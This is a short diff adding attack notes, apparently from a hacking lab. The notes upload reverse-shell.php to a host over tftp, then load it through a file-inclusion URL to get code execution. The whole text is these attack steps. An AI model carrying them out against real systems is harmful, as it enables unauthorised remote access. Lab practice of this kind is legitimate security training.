@@ -1,0 +1,7 @@
+> tftp  10.129.95.185
+
+put reverse-shell.php
+
+exit
+
+http://10.129.95.185/?file=/var/lib/tftpboot/reverse-shell.php
